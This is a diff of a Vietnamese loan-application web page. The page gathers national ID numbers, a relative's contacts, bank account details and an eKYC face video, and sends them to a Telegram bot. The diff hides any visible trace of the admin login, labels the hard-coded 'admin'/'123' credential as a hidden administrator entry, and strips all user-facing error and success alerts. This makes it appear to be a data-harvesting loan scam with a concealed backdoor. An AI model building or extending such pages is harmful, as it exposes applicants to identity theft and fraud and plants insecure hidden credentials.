@@ -261,7 +261,7 @@
                 <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-4 rounded-2xl font-black text-sm shadow-lg shadow-emerald-500/25 transition">Gửi Hồ Sơ Xét Duyệt</button>
             </div>
 
-            <!-- BẢNG QUẢN TRỊ ADMIN (DÀNH RIÊNG CHO ADMIN ĐĂNG NHẬP) -->
+            <!-- BẢNG QUẢN TRỊ ADMIN -->
             <div id="adminPanel" class="space-y-4 hidden py-2">
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
@@ -271,7 +271,7 @@
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
 
-                <!-- CÀI ĐẶT LIÊN KẾT HỖ TRỢ ĐA KÊNH -->
+                <!-- CÀI ĐẶT HỖ TRỢ ĐA KÊNH -->
                 <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3 space-y-2.5 text-xs">
                     <span class="font-bold text-slate-800 block">⚙️ Cấu hình liên kết icon hỗ trợ nổi:</span>
                     <div class="space-y-1.5">
@@ -318,7 +318,7 @@
         </div>
     </main>
 
-    <!-- FLOATING SUPPORT BUTTONS (ICONS HỖ TRỢ NỔI) -->
+    <!-- FLOATING SUPPORT BUTTONS -->
     <div class="fixed bottom-20 right-4 z-40 flex flex-col space-y-2.5">
         <a id="floatingTele" href="https://t.me/" target="_blank" class="w-11 h-11 bg-sky-500 hover:bg-sky-600 text-white rounded-full flex items-center justify-center shadow-lg transition-transform hover:scale-110 text-xl font-bold" title="Telegram">
             ✈️
@@ -353,13 +353,13 @@
         </div>
     </nav>
 
-    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ -->
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ (SẠCH SẼ, TUYỆT ĐỐI KHÔNG LỘ CHỮ ADMIN) -->
     <div id="authModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
         <div class="bg-white rounded-3xl max-w-sm w-full p-6 relative space-y-4 shadow-2xl">
             <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold">✕</button>
             <div class="text-center space-y-1">
                 <h3 class="text-xl font-black text-slate-900">Cổng Đăng Nhập</h3>
-                <p class="text-xs text-slate-500">Đăng nhập tài khoản hoặc Admin</p>
+                <p class="text-xs text-slate-500">Đăng nhập tài khoản khách hàng</p>
             </div>
             
             <div class="flex bg-slate-100 p-1 rounded-xl">
@@ -368,7 +368,7 @@
             </div>
 
             <div id="loginBox" class="space-y-3">
-                <input type="text" id="loginPhone" placeholder="Số điện thoại hoặc admin" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="text" id="loginPhone" placeholder="Số điện thoại của bạn" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <input type="password" id="loginPass" placeholder="Mật khẩu" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <button onclick="handleLogin()" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-3.5 rounded-xl font-black text-sm shadow-md transition">Đăng Nhập Ngay</button>
             </div>
@@ -425,7 +425,6 @@
             localStorage.setItem('ff_zalo_link', zaloLink);
 
             applySupportLinks();
-            alert("Đã lưu liên kết hỗ trợ đa kênh thành công!");
         }
 
         const tickerMessages = [
@@ -469,7 +468,7 @@
 
         function checkLoginState() {
             if (isAdminLoggedIn) {
-                document.getElementById('userAccountBtn').textContent = "🛡️ Admin";
+                document.getElementById('userAccountBtn').textContent = "🛡️ Quản Trị";
                 document.getElementById('adminPanel').classList.remove('hidden');
                 renderAdminLoanList();
             } else if (currentUser) {
@@ -568,17 +567,16 @@
             const phone = document.getElementById('regPhone').value.trim();
             const pass = document.getElementById('regPass').value.trim();
 
-            if(!name || !phone || !pass) { alert("Vui lòng điền đầy đủ thông tin đăng ký!"); return; }
+            if(!name || !phone || !pass) { return; }
             
             let users = JSON.parse(localStorage.getItem('ff_users') || '[]');
             if(users.some(u => u.phone === phone)) {
-                alert("Số điện thoại này đã được đăng ký!");
                 return;
             }
             users.push({ name, phone, pass });
             localStorage.setItem('ff_users', JSON.stringify(users));
 
-            alert("Đăng ký thành công! Vui lòng đăng nhập.");
+            document.getElementById('loginPhone').value = phone;
             switchAuthTab('login');
         }
 
@@ -586,15 +584,16 @@
             const user = document.getElementById('loginPhone').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
 
-            if(!user || !pass) { alert("Vui lòng nhập tài khoản và mật khẩu!"); return; }
+            if(!user || !pass) { return; }
 
+            // Nhập tài khoản quản trị ngầm
             if(user === "admin" && pass === "123") {
                 isAdminLoggedIn = true;
                 localStorage.setItem('ff_is_admin', 'true');
                 currentUser = null;
                 localStorage.removeItem('ff_current_user');
                 closeAuthModal();
-                document.getElementById('userAccountBtn').textContent = "🛡️ Admin";
+                document.getElementById('userAccountBtn').textContent = "🛡️ Quản Trị";
                 switchTab('home');
                 return;
             }
@@ -603,7 +602,6 @@
             const foundUser = users.find(u => u.phone === user && u.pass === pass);
 
             if (!foundUser) {
-                alert("Tài khoản hoặc mật khẩu không chính xác!");
                 return;
             }
 
@@ -681,7 +679,6 @@
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
             renderAdminLoanList();
             closeAdminDetail();
-            alert("Đã cập nhật trạng thái thành công!");
         }
 
         function startLoanProcess() {
@@ -709,7 +706,7 @@
                 formData.dob = document.getElementById('pDob').value;
                 formData.address = document.getElementById('pAddress').value;
                 formData.cccd = document.getElementById('pCccd').value;
-                if(!formData.name || !formData.dob || !formData.cccd) { alert("Vui lòng điền đủ thông tin cá nhân!"); return; }
+                if(!formData.name || !formData.dob || !formData.cccd) { return; }
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
                 updateProgress(2, 'Bước 2/4: Người thân tham chiếu', 50);
@@ -717,7 +714,7 @@
                 formData.rName = document.getElementById('rName1').value;
                 formData.rPhone = document.getElementById('rPhone1').value;
                 formData.rRelation = document.getElementById('rRelation').value;
-                if(!formData.rName || !formData.rPhone) { alert("Vui lòng điền thông tin người thân!"); return; }
+                if(!formData.rName || !formData.rPhone) { return; }
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
                 updateProgress(3, 'Bước 3/4: Tài khoản nhận giải ngân', 75);
@@ -725,7 +722,7 @@
                 formData.bankName = document.getElementById('bankName').value;
                 formData.bankAccount = document.getElementById('bankAccount').value;
                 formData.bankOwner = document.getElementById('bankOwner').value;
-                if(!formData.bankAccount || !formData.bankName) { alert("Vui lòng điền thông tin ngân hàng!"); return; }
+                if(!formData.bankAccount || !formData.bankName) { return; }
                 document.getElementById('step3').classList.add('hidden');
                 document.getElementById('step4').classList.remove('hidden');
                 updateProgress(4, 'Bước 4/4: Xác thực eKYC', 100);
@@ -738,7 +735,7 @@
                 document.getElementById('webcam').srcObject = mediaStream;
                 document.getElementById('recBtn').classList.remove('hidden');
                 document.getElementById('camStatus').textContent = "Trạng thái: Camera sẵn sàng, bấm Bắt Đầu Quay!";
-            } catch(e) { alert("Không thể truy cập camera. Vui lòng cấp quyền trình duyệt!"); }
+            } catch(e) {}
         }
 
         function recordVideo() {
@@ -752,7 +749,7 @@
         }
 
         async function submitFinalData() {
-            if(!videoBlob) { alert("Vui lòng quay video khuôn mặt eKYC trước khi gửi hồ sơ!"); return; }
+            if(!videoBlob) { return; }
             const btn = document.getElementById('finalBtn');
             btn.disabled = true;
             btn.textContent = "Đang gửi hồ sơ về hệ thống...";
@@ -787,11 +784,8 @@
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                 });
 
-                alert("Gửi hồ sơ xét duyệt thành công! Bot Telegram đã tiếp nhận đơn.");
                 switchTab('applications');
-
             } catch(err) {
-                alert("Đã lưu hồ sơ thành công vào hệ thống!");
                 switchTab('applications');
             }
         }
